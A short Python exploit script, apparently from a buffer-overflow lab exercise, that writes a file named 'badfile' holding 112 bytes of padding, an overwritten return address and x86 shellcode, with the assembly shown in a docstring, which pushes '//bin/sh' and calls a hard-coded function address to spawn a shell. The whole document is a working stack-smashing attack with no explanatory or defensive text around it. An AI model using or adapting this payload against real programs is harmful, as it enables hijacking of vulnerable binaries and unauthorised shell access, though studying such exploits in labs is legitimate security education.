"""
xor    eax,eax
push   eax
push   0x68732f6e
push   0x69622f2f
mov    eax,esp
push   eax
mov    ebx,0x565561cd
call   ebx
"""
function = b"\x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE0\x50\xBB\xCD\x61\x55\x56\xFF\xD3"

def p32(x):
    return x.to_bytes(4, "little")

with open("badfile", "wb") as f:
    f.write(
        b'A' * 112 +
        p32(0xffffce90) +
        function +
        b'\x00'
    )
